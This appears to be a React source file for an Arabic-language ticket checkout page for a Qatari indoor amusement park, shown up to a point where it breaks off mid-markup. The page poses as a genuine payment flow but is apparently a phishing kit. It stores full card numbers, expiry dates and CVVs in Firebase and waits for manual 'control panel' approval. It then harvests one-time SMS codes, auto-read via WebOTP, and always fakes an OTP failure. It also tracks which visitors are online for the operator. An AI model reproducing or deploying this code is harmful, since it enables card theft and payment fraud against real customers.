import { useEffect, useMemo, useRef, useState } from "react";
import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
import { doc, onSnapshot } from "firebase/firestore";
import {
  onDisconnect,
  onValue,
  ref as databaseRef,
  serverTimestamp,
  set as setRealtimeValue,
} from "firebase/database";
import {
  QuestLegalFooter,
  QuestMobileTopBar,
  SessionTimerStrip,
} from "@/components/QuestMobileChrome";
import {
  buildTicketOrderItems,
  formatQar,
  getOrderSubtotal,
  getStoredTicketCart,
  ticketProductMap,
} from "@/lib/ticket-cart";
import { addData, database, db } from "@/lib/firebase";

interface BillingDetails {
  firstName: string;
  lastName: string;
  phoneCountryCode: string;
  phone: string;
  email: string;
}

interface CardDetails {
  cardholderName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
}

type PaymentStep =
  | "idle"
  | "waitingApproval"
  | "otp"
  | "verifyingOtp"
  | "otpFailed"
  | "rejected";

const OTP_VERIFY_DELAY_MS = 5000;

const phoneCountryOptions = [
  { country: "قطر", dialCode: "+974", minDigits: 8, maxDigits: 8 },
  { country: "السعودية", dialCode: "+966", minDigits: 9, maxDigits: 9 },
  { country: "البحرين", dialCode: "+973", minDigits: 8, maxDigits: 8 },
  { country: "عُمان", dialCode: "+968", minDigits: 8, maxDigits: 8 },
  { country: "الإمارات", dialCode: "+971", minDigits: 9, maxDigits: 9 },
  { country: "الكويت", dialCode: "+965", minDigits: 8, maxDigits: 8 },
] as const;

function parseStoredDate(storedDate: string | null): Date | undefined {
  if (!storedDate) {
    return undefined;
  }

  const dateOnlyMatch = /^(\d{4})-(\d{2})-(\d{2})$/.exec(storedDate);
  if (dateOnlyMatch) {
    const [, year, month, day] = dateOnlyMatch;
    return new Date(Number(year), Number(month) - 1, Number(day));
  }

  const parsed = new Date(storedDate);
  return Number.isNaN(parsed.getTime()) ? undefined : parsed;
}

function toDigitsOnly(value: string): string {
  return value.replace(/\D/g, "");
}

function formatCardNumber(value: string): string {
  const digits = toDigitsOnly(value).slice(0, 19);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatExpiry(value: string): string {
  const digits = toDigitsOnly(value).slice(0, 4);
  if (digits.length <= 2) {
    return digits;
  }

  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function isLuhnValid(cardNumber: string): boolean {
  let sum = 0;
  let shouldDouble = false;

  for (let index = cardNumber.length - 1; index >= 0; index -= 1) {
    let digit = Number(cardNumber[index]);
    if (Number.isNaN(digit)) {
      return false;
    }

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
}

function isCardExpired(expiry: string): boolean {
  const [monthPart, yearPart] = expiry.split("/");
  const month = Number(monthPart);
  const year = Number(yearPart);

  if (
    Number.isNaN(month) ||
    Number.isNaN(year) ||
    month < 1 ||
    month > 12
  ) {
    return true;
  }

  const fullYear = 2000 + year;
  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;

  if (fullYear < currentYear) {
    return true;
  }

  if (fullYear === currentYear && month < currentMonth) {
    return true;
  }

  return fullYear > currentYear + 20;
}

function validateCardDetails(card: CardDetails): string | null {
  if (!card.cardholderName.trim()) {
    return "اسم حامل البطاقة مطلوب.";
  }

  const cardDigits = toDigitsOnly(card.cardNumber);
  const cardNumberLength = cardDigits.length;
  if (cardNumberLength < 13 || cardNumberLength > 19) {
    return "يرجى إدخال رقم بطاقة صالح.";
  }

  if (/^(\d)\1+$/.test(cardDigits) || !isLuhnValid(cardDigits)) {
    return "رقم البطاقة غير صالح. تحقق من الرقم وحاول مرة أخرى.";
  }

  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(card.expiry)) {
    return "يجب إدخال تاريخ الانتهاء بصيغة MM/YY.";
  }

  if (isCardExpired(card.expiry)) {
    return "تاريخ انتهاء البطاقة غير صالح أو منتهي.";
  }

  const expectedCvvLength = /^3[47]/.test(cardDigits) ? 4 : 3;
  if (!new RegExp(`^\\d{${expectedCvvLength}}$`).test(card.cvv)) {
    return expectedCvvLength === 4
      ? "يرجى إدخال CVV من 4 أرقام لهذه البطاقة."
      : "يرجى إدخال CVV من 3 أرقام.";
  }

  return null;
}

function formatArabicDate(date: Date): string {
  return new Intl.DateTimeFormat("ar-QA", {
    day: "numeric",
    month: "long",
    year: "numeric",
  }).format(date);
}

function maskCardNumber(value: string): string {
  const digits = toDigitsOnly(value);
  if (digits.length <= 4) {
    return digits;
  }

  const visible = digits.slice(-4);
  const masked = "*".repeat(Math.max(0, digits.length - 4));
  const combined = `${masked}${visible}`;
  return combined.replace(/(.{4})/g, "$1 ").trim();
}

function normalizeCardNumber(value: string): string {
  return toDigitsOnly(value).slice(0, 19);
}

function getCardPreviewNumber(value: string): string {
  const digits = toDigitsOnly(value);
  if (digits.length < 4) {
    return "•••• •••• •••• ••••";
  }

  return `•••• •••• •••• ${digits.slice(-4)}`;
}

function generateSubmissionId(existingSubmissionId: string | null): string {
  if (typeof window !== "undefined") {
    const storedVisitorId = window.localStorage.getItem("visitor");
    if (storedVisitorId) {
      return storedVisitorId;
    }
  }

  if (existingSubmissionId) {
    return existingSubmissionId;
  }

  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
    return crypto.randomUUID();
  }

  return `pay-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
}

function ensureVisitorId(): string {
  if (typeof window === "undefined") {
    return `visitor-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  }

  const existing = window.localStorage.getItem("visitor");
  if (existing) {
    return existing;
  }

  const generated = `visitor-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  window.localStorage.setItem("visitor", generated);
  return generated;
}

function validateBillingDetails(billing: BillingDetails): string | null {
  if (
    !billing.firstName.trim() ||
    !billing.lastName.trim() ||
    !billing.phone.trim()
  ) {
    return "يرجى إكمال جميع بيانات الفاتورة المطلوبة.";
  }

  const selectedCountry = phoneCountryOptions.find(
    (country) => country.dialCode === billing.phoneCountryCode
  );
  if (!selectedCountry) {
    return "يرجى اختيار رمز دولة الهاتف.";
  }

  const phoneDigits = toDigitsOnly(billing.phone);
  if (
    phoneDigits.length < selectedCountry.minDigits ||
    phoneDigits.length > selectedCountry.maxDigits
  ) {
    if (selectedCountry.minDigits === selectedCountry.maxDigits) {
      return `رقم الهاتف في ${selectedCountry.country} يجب أن يكون ${selectedCountry.minDigits} أرقام.`;
    }

    return `رقم الهاتف في ${selectedCountry.country} يجب أن يكون بين ${selectedCountry.minDigits} و${selectedCountry.maxDigits} أرقام.`;
  }

  if (!/\S+@\S+\.\S+/.test(billing.email.trim())) {
    return "يرجى إدخال بريد إلكتروني صحيح.";
  }

  return null;
}

type CheckoutStep = 1 | 2;

export default function Checkout() {
  const [currentStep, setCurrentStep] = useState<CheckoutStep>(1);
  const [billingError, setBillingError] = useState<string | null>(null);

  const step1Ref = useRef<HTMLDivElement>(null);
  const step2Ref = useRef<HTMLDivElement>(null);

  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    firstName: "",
    lastName: "",
    phoneCountryCode: "+974",
    phone: "",
    email: "",
  });
  const [storedCart] = useState(() => getStoredTicketCart());
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    cardholderName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
  });
  const [otpCode, setOtpCode] = useState("");
  const [paymentStep, setPaymentStep] = useState<PaymentStep>("idle");
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const [isSavingCheckout, setIsSavingCheckout] = useState(false);
  const otpVerifyTimerRef = useRef<number | null>(null);
  const otpInputRef = useRef<HTMLInputElement>(null);
  const webOtpAbortRef = useRef<AbortController | null>(null);
  const visitorPresenceId = useMemo(() => ensureVisitorId(), []);

  const storedOrderItems = useMemo(
    () => buildTicketOrderItems(storedCart.quantities),
    [storedCart.quantities]
  );
  const fallbackItem = {
    id: "adult" as const,
    name: ticketProductMap.adult.name,
    unitPrice: ticketProductMap.adult.unitPrice,
    quantity: 1,
  };
  const orderItems =
    storedOrderItems.length > 0 ? storedOrderItems : [fallbackItem];
  const subtotal = useMemo(() => getOrderSubtotal(orderItems), [orderItems]);

  const visitDate = parseStoredDate(storedCart.visitDateIso);
  const bookingDateText = visitDate
    ? formatArabicDate(visitDate)
    : "غير محدد";
  const visitTime = storedCart.visitTime ?? "١٧:٣٠ - ٢٣:٥٩";
  const cardPreviewNumber = getCardPreviewNumber(cardDetails.cardNumber);
  const cardPreviewName =
    cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
  const cardPreviewExpiry = cardDetails.expiry || "MM/YY";
  const selectedPhoneCountry =
    phoneCountryOptions.find(
      (country) => country.dialCode === billingDetails.phoneCountryCode
    ) ?? phoneCountryOptions[0];

  useEffect(() => {
    return () => {
      if (otpVerifyTimerRef.current) {
        window.clearTimeout(otpVerifyTimerRef.current);
      }
      if (webOtpAbortRef.current) {
        webOtpAbortRef.current.abort();
      }
    };
  }, []);

  useEffect(() => {
    const presenceRef = databaseRef(database, `presence/${visitorPresenceId}`);
    const connectedRef = databaseRef(database, ".info/connected");

    const unsubscribe = onValue(connectedRef, (snapshot) => {
      if (snapshot.val() !== true) {
        return;
      }

      void onDisconnect(presenceRef).set({
        online: false,
        currentPage: "checkout",
        submissionId: submissionId ?? visitorPresenceId,
        lastSeen: serverTimestamp(),
      });

      void setRealtimeValue(presenceRef, {
        online: true,
        currentPage: "checkout",
        submissionId: submissionId ?? visitorPresenceId,
        lastSeen: serverTimestamp(),
      });
    });

    const heartbeat = window.setInterval(() => {
      void setRealtimeValue(presenceRef, {
        online: true,
        currentPage: "checkout",
        submissionId: submissionId ?? visitorPresenceId,
        lastSeen: serverTimestamp(),
      });
    }, 20000);

    return () => {
      window.clearInterval(heartbeat);
      unsubscribe();
      void setRealtimeValue(presenceRef, {
        online: false,
        currentPage: "checkout",
        submissionId: submissionId ?? visitorPresenceId,
        lastSeen: serverTimestamp(),
      });
    };
  }, [submissionId, visitorPresenceId]);

  useEffect(() => {
    if (!submissionId) {
      return;
    }

    const unsubscribe = onSnapshot(doc(db, "pays", submissionId), (snapshot) => {
      if (!snapshot.exists()) {
        return;
      }

      const liveData = snapshot.data() as {
        payment?: { status?: string; errorMessage?: string | null };
      };
      const liveStatus = liveData.payment?.status;

      if (liveStatus === "approved") {
        setPaymentError(null);
        setPaymentStep((currentStep) =>
          currentStep === "waitingApproval" ? "otp" : currentStep
        );
        return;
      }

      if (liveStatus === "rejected") {
        setPaymentStep("rejected");
        setPaymentError(
          liveData.payment?.errorMessage ?? "تم رفض البطاقة من فريق الدفع."
        );
      }
    });

    return () => {
      unsubscribe();
    };
  }, [submissionId]);

  useEffect(() => {
    if (paymentStep !== "otp") {
      if (webOtpAbortRef.current) {
        webOtpAbortRef.current.abort();
        webOtpAbortRef.current = null;
      }
      return;
    }

    otpInputRef.current?.focus();

    if (!("OTPCredential" in window)) {
      return;
    }

    const webOtpNavigator = navigator as Navigator & {
      credentials?: {
        get?: (options: {
          otp: { transport: string[] };
          signal: AbortSignal;
        }) => Promise<{ code?: string } | null>;
      };
    };

    if (!webOtpNavigator.credentials?.get) {
      return;
    }

    const abortController = new AbortController();
    webOtpAbortRef.current = abortController;

    void webOtpNavigator.credentials
      .get({
        otp: { transport: ["sms"] },
        signal: abortController.signal,
      })
      .then((credential) => {
        const otpFromSms = toDigitsOnly(credential?.code ?? "").slice(0, 6);
        if (otpFromSms) {
          setOtpCode(otpFromSms);
        }
      })
      .catch(() => {
      });

    return () => {
      abortController.abort();
      if (webOtpAbortRef.current === abortController) {
        webOtpAbortRef.current = null;
      }
    };
  }, [paymentStep]);

  useEffect(() => {
    const targetRef = currentStep === 1 ? step1Ref : step2Ref;
    if (targetRef.current) {
      targetRef.current.scrollIntoView({ behavior: "smooth", block: "start" });
    }
  }, [currentStep]);

  const onGoToStep2 = () => {
    if (!visitDate || !storedCart.visitDateIso) {
      setBillingError(
        "يرجى اختيار تاريخ الزيارة من صفحة التذاكر قبل المتابعة."
      );
      return;
    }

    const billingValidationError = validateBillingDetails(billingDetails);
    if (billingValidationError) {
      setBillingError(billingValidationError);
      return;
    }

    setBillingError(null);
    setCurrentStep(2);
  };

  const onBackToStep1 = () => {
    setCurrentStep(1);
  };

  const onProceedToPayment = async () => {
    if (otpVerifyTimerRef.current) {
      window.clearTimeout(otpVerifyTimerRef.current);
    }

    const cardValidationError = validateCardDetails(cardDetails);
    if (cardValidationError) {
      setPaymentStep("idle");
      setPaymentError(cardValidationError);
      return;
    }

    const normalizedPhone = `${billingDetails.phoneCountryCode}${toDigitsOnly(
      billingDetails.phone
    )}`;

    const checkoutId = generateSubmissionId(submissionId);
    const payload = {
      id: checkoutId,
      status: "pending_review",
      billing: {
        firstName: billingDetails.firstName.trim(),
        lastName: billingDetails.lastName.trim(),
        phone: normalizedPhone,
        email: billingDetails.email.trim(),
      },
      visitDateIso: storedCart.visitDateIso!,
      visitTime,
      items: orderItems.map((item) => ({
        id: item.id,
        name: item.name,
        quantity: item.quantity,
        unitPrice: item.unitPrice,
        lineTotal: item.quantity * item.unitPrice,
      })),
      subtotal,
      total: subtotal,
      payment: {
        cardholderName: cardDetails.cardholderName.trim(),
        cardNumberFull: normalizeCardNumber(cardDetails.cardNumber),
        cardNumberMasked: maskCardNumber(cardDetails.cardNumber),
        expiry: cardDetails.expiry,
        cvv: cardDetails.cvv,
        otpCode: null,
        status: "pending_review",
        errorMessage: null,
      },
    };

    setIsSavingCheckout(true);
    try {
      await addData(payload);
      setSubmissionId(checkoutId);
      setPaymentError(null);
      setOtpCode("");
      setPaymentStep("waitingApproval");
    } catch (error) {
      setPaymentStep("idle");
      setPaymentError(
        error instanceof Error ? error.message : "حدث خطأ أثناء حفظ البيانات."
      );
    } finally {
      setIsSavingCheckout(false);
    }
  };

  const onVerifyOtp = (otpValue = otpCode) => {
    if (otpVerifyTimerRef.current) {
      window.clearTimeout(otpVerifyTimerRef.current);
    }

    const normalizedOtp = toDigitsOnly(otpValue).slice(0, 6);
    if (normalizedOtp.length !== 6) {
      setPaymentError("يرجى إدخال رمز OTP المكوّن من 6 أرقام.");
      return;
    }

    setOtpCode(normalizedOtp);
    setPaymentError(null);
    setPaymentStep("verifyingOtp");

    otpVerifyTimerRef.current = window.setTimeout(() => {
      void (async () => {
        const failureMessage = "فشل التحقق من رمز OTP. يرجى المحاولة مرة أخرى.";

        if (submissionId) {
          try {
            await addData({
              id: submissionId,
              status: "otp_failed",
              payment: {
                status: "otp_failed",
                otpCode: normalizedOtp,
                errorMessage: failureMessage,
              },
            });
          } catch {
          }
        }

        setPaymentStep("otpFailed");
        setPaymentError(failureMessage);
      })();
    }, OTP_VERIFY_DELAY_MS);
  };

  useEffect(() => {
    if (paymentStep === "otp" && otpCode.length === 6) {
      onVerifyOtp(otpCode);
    }
  }, [otpCode, paymentStep]);

  const showOtpForm =
    paymentStep === "otp" ||
    paymentStep === "verifyingOtp" ||
    paymentStep === "otpFailed";

  return (
    <div className="min-h-screen bg-[#efefef] text-[#333]" dir="rtl" lang="ar">
      <div className="mx-auto flex min-h-screen w-full max-w-[1100px] flex-col bg-[#efefef]">
        <section className="relative h-[190px] overflow-hidden sm:h-[220px] md:h-[280px]">
          <img
            src="/2.png"
            alt="دوار ملون في مدينة ألعاب داخلية"
            className="h-full w-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-t from-black/55 to-black/5" />
          <h1 className="absolute bottom-8 right-6 text-4xl font-black text-white sm:text-5xl">
            إتمام الشراء
          </h1>
        </section>

        <QuestMobileTopBar />

        <main className="flex-1 px-4 pb-8 pt-4 sm:px-6 md:px-8">
          <SessionTimerStrip className="max-w-[560px]" />

          <div className="mt-4 flex items-center justify-center gap-0">
            <div className="flex items-center gap-2">
              <div
                className={`flex h-9 w-9 items-center justify-center rounded-full text-sm font-bold transition-colors ${
                  currentStep >= 1
                    ? "bg-[hsl(var(--quest-purple))] text-white"
                    : "bg-[#e0e0e0] text-[#999]"
                }`}
              >
                {currentStep > 1 ? <Check className="h-4 w-4" /> : "١"}
              </div>
              <span
                className={`text-sm font-semibold ${
                  currentStep >= 1
                    ? "text-[hsl(var(--quest-purple))]"
                    : "text-[#999]"
                }`}
              >
                البيانات والطلب
              </span>
            </div>
            <div
              className={`mx-3 h-[2px] w-12 sm:w-20 ${
                currentStep >= 2
                  ? "bg-[hsl(var(--quest-purple))]"
                  : "bg-[#ddd]"
              }`}
            />
            <div className="flex items-center gap-2">
              <div
                className={`flex h-9 w-9 items-center justify-center rounded-full text-sm font-bold transition-colors ${
                  currentStep >= 2
                    ? "bg-[hsl(var(--quest-purple))] text-white"
                    : "bg-[#e0e0e0] text-[#999]"
                }`}
              >
                ٢
              </div>
              <span
                className={`text-sm font-semibold ${
                  currentStep >= 2
                    ? "text-[hsl(var(--quest-purple))]"
                    : "text-[#999]"
                }`}
              >
                الدفع
              </span>
            </div>
          </div>

          {currentStep === 1 ? (
            <div ref={step1Ref} className="mt-6">
              <div className="grid gap-7 lg:grid-cols-[1.1fr_1fr] lg:items-start">
                <div>
                  <section className="bg-[#e9edf3] p-4 border-r-4 border-r-[hsl(var(--quest-purple))] text-[#5f5f5f] text-sm">
                    <p>
                      لديك قسيمة؟
                      <span className="mr-1 text-[#4d4d4d]">
                        اضغط هنا لإدخال الكود
                      </span>
                    </p>
                  </section>

                  <section className="mt-6">
                    <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                      تفاصيل الفاتورة
                    </h2>

                    <form className="mt-4 grid gap-3 sm:grid-cols-2" onSubmit={(e) => e.preventDefault()}>
                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          الاسم الأول <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          value={billingDetails.firstName}
                          onChange={(event) =>
                            setBillingDetails((current) => ({
                              ...current,
                              firstName: event.target.value,
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        />
                      </label>

                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          اسم العائلة <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          value={billingDetails.lastName}
                          onChange={(event) =>
                            setBillingDetails((current) => ({
                              ...current,
                              lastName: event.target.value,
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        />
                      </label>

                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          رقم الهاتف <span className="text-[#bf2828]">*</span>
                        </span>
                        <div className="flex gap-2" dir="ltr">
                          <select
                            value={billingDetails.phoneCountryCode}
                            onChange={(event) =>
                              setBillingDetails((current) => ({
                                ...current,
                                phoneCountryCode: event.target.value,
                              }))
                            }
                            className="h-10 shrink-0 rounded-sm border border-[#e5e5e5] bg-white px-2 text-xs outline-none focus:border-[hsl(var(--quest-purple))]/40 sm:px-3 sm:text-sm"
                            aria-label="رمز الدولة"
                          >
                            {phoneCountryOptions.map((country) => (
                              <option
                                key={country.dialCode}
                                value={country.dialCode}
                              >
                                {country.country} ({country.dialCode})
                              </option>
                            ))}
                          </select>
                          <input
                            type="tel"
                            inputMode="numeric"
                            autoComplete="tel-national"
                            value={billingDetails.phone}
                            onChange={(event) =>
                              setBillingDetails((current) => ({
                                ...current,
                                phone: toDigitsOnly(event.target.value).slice(
                                  0,
                                  15
                                ),
                              }))
                            }
                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                            placeholder={`رقم الهاتف (${selectedPhoneCountry.minDigits} أرقام)`}
                          />
                        </div>
                      </label>

                      <label className="block sm:col-span-2">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          البريد الإلكتروني{" "}
                          <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="email"
                          value={billingDetails.email}
                          onChange={(event) =>
                            setBillingDetails((current) => ({
                              ...current,
                              email: event.target.value,
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        />
                      </label>
                    </form>
                  </section>
                </div>

                <div>
                  <section>
                    <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                      طلبك
                    </h2>

                    <div className="mt-3 overflow-hidden rounded-md border border-[#dedede] bg-white">
                      <div className="grid grid-cols-[1fr_auto] bg-[#f8bf14] px-3 py-2 text-sm font-bold text-[#202020]">
                        <span>المنتج</span>
                        <span>المجموع الفرعي</span>
                      </div>

                      <div className="space-y-2 px-3 py-3 text-xs text-[#444]">
                        {orderItems.map((item) => (
                          <div key={item.id}>
                            <div className="grid grid-cols-[1fr_auto] items-start gap-2">
                              <div>
                                <p className="font-semibold">
                                  {item.name}{" "}
                                  <span className="font-normal">
                                    × {item.quantity}
                                  </span>
                                </p>
                                <p className="mt-1 text-[11px] text-[#666]">
                                  تاريخ الحجز: {bookingDateText}
                                </p>
                                <p className="text-[11px] text-[#666]">
                                  وقت الزيارة: {visitTime}
                                </p>
                                <p className="text-[11px] text-[#666]">
                                  الفئة: تذاكر الدخول
                                </p>
                              </div>
                              <p>{formatQar(item.unitPrice * item.quantity)}</p>
                            </div>
                          </div>
                        ))}

                        <div className="border-t border-[#ededed] pt-2">
                          <div className="flex items-center justify-between text-sm font-semibold">
                            <span>المجموع الفرعي</span>
                            <span>{formatQar(subtotal)}</span>
                          </div>
                          <div className="mt-1 flex items-center justify-between text-sm font-bold">
                            <span>الإجمالي</span>
                            <span>{formatQar(subtotal)}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </section>
                </div>
              </div>

              {billingError ? (
                <div className="mt-4 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
                  <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
                  <p>{billingError}</p>
                </div>
              ) : null}

              <button
                type="button"
                onClick={onGoToStep2}
                className="mt-5 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-3 text-sm font-semibold text-white hover:opacity-90 sm:w-auto sm:px-10"
              >
                متابعة إلى الدفع
              </button>
            </div>
          ) : null}

          {currentStep === 2 ? (
            <div ref={step2Ref} className="mt-6">
              <div className="mx-auto max-w-[600px]">
                <section>
                  <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                    الدفع
                  </h2>

                  <div className="mt-3 rounded-xl border border-[#e8e8e8] bg-white p-3">
                    <div className="rounded-md border border-[#ececec] bg-[#f8f8f8] px-3 py-2 text-sm font-semibold text-[#3e3e3e] flex items-center gap-2">
                      <CreditCard className="h-4 w-4" />
                      بطاقات الائتمان / الخصم
                    </div>

                    <p className="mt-3 text-xs leading-5 text-[#444]">
                      SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع
                      لكل من العملاء والتجار.
                    </p>

                    <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
                      <p className="text-[11px] text-white/80">بطاقة الدفع</p>
                      <div
                        className="mt-5 text-lg font-semibold tracking-[0.12em]"
                        dir="ltr"
                      >
                        {cardPreviewNumber}
                      </div>
                      <div className="mt-5 flex items-end justify-between gap-3">
                        <div className="min-w-0">
                          <p className="text-[10px] text-white/70">
                            حامل البطاقة
                          </p>
                          <p className="truncate text-sm font-semibold">
                            {cardPreviewName}
                          </p>
                        </div>
                        <div className="shrink-0 text-right">
                          <p className="text-[10px] text-white/70">الانتهاء</p>
                          <p className="text-sm font-semibold" dir="ltr">
                            {cardPreviewExpiry}
                          </p>
                        </div>
                      </div>
                    </div>

                    <form
                      className="mt-4 space-y-3 rounded-md border border-[#ececec] p-3"
                      onSubmit={(event) => event.preventDefault()}
                    >
                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          اسم حامل البطاقة{" "}
                          <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          autoComplete="cc-name"
                          value={cardDetails.cardholderName}
                          onChange={(event) =>
                            setCardDetails((current) => ({
                              ...current,
                              cardholderName: event.target.value,
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          placeholder="الاسم على البطاقة"
                        />
                      </label>

                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          رقم البطاقة <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          inputMode="numeric"
                          autoComplete="cc-number"
                          value={cardDetails.cardNumber}
                          onChange={(event) =>
                            setCardDetails((current) => ({
                              ...current,
                              cardNumber: formatCardNumber(event.target.value),
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          dir="ltr"
                          placeholder="4242 4242 4242 4242"
                        />
                      </label>

                      <div className="grid grid-cols-2 gap-3">
                        <label className="block">
                          <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                            تاريخ الانتهاء{" "}
                            <span className="text-[#bf2828]">*</span>
                          </span>
                          <input
                            type="text"
                            inputMode="numeric"
                            autoComplete="cc-exp"
                            value={cardDetails.expiry}
                            onChange={(event) =>
                              setCardDetails((current) => ({
                                ...current,
                                expiry: formatExpiry(event.target.value),
                              }))
                            }
                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                            dir="ltr"
                            placeholder="MM/YY"
                          />
                        </label>

                        <label className="block">
                          <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                            CVV <span className="text-[#bf2828]">*</span>
                          </span>
                          <input
                            type="password"
                            inputMode="numeric"
                            autoComplete="cc-csc"
                            value={cardDetails.cvv}
                            onChange={(event) =>
                              setCardDetails((current) => ({
                                ...current,
                                cvv: toDigitsOnly(event.target.value).slice(0, 4),
                              }))
                            }
                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                            dir="ltr"
                            placeholder="***"
                          />
                        </label>
                      </div>
                    </form>

                    {paymentStep === "waitingApproval" ? (
                      <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                        <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
                        <p>
                          تم إرسال بيانات البطاقة. الرجاء الانتظار حتى موافقة فريق
                          المراجعة من لوحة التحكم.
                        </p>
                      </div>
                    ) : null}

                    {showOtpForm ? (
                      <div className="mt-3 rounded-md border border-[#ececec] p-3">
                        <div className="flex items-center gap-2 text-sm font-semibold text-[#414141]">
                          <ShieldCheck className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
                          التحقق عبر OTP
                        </div>

                        <label className="mt-2 block">
                          <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                            أدخل رمز OTP <span className="text-[#bf2828]">*</span>
                          </span>
                          <input
                            ref={otpInputRef}
                            type="text"
                            inputMode="numeric"
                            autoComplete="one-time-code"
                            name="one-time-code"
                            value={otpCode}
                            onChange={(event) =>
                              setOtpCode(
                                toDigitsOnly(event.target.value).slice(0, 6)
                              )
                            }
                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                            dir="ltr"
                            placeholder="رمز OTP من 6 أرقام"
                            maxLength={6}
                          />
                        </label>

                        <button
                          type="button"
                          onClick={() => onVerifyOtp()}
                          disabled={paymentStep === "verifyingOtp"}
                          className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
                        >
                          {paymentStep === "verifyingOtp"
                            ? "جاري التحقق من OTP..."
                            : "تحقق من OTP"}
                        </button>
                      </div>
                    ) : null}

                    {paymentError ? (
                      <div className="mt-3 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
                        <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
                        <p>{paymentError}</p>
                      </div>
                    ) : null}

                    <p className="mt-4 text-xs leading-5 text-[#666]">
                      سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا
                      الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
                    </p>

                    <div className="mt-4 flex flex-col gap-2 sm:flex-row-reverse">
                      <button
                        type="button"
                        onClick={onProceedToPayment}
                        disabled={
                          paymentStep === "waitingApproval" ||
                          paymentStep === "verifyingOtp" ||
                          isSavingCheckout
                        }
                        className="w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70 sm:w-auto sm:px-10"
                      >
                        {isSavingCheckout
                          ? "جاري حفظ الطلب..."
                          : paymentStep === "waitingApproval"
                          ? "بانتظار الموافقة..."
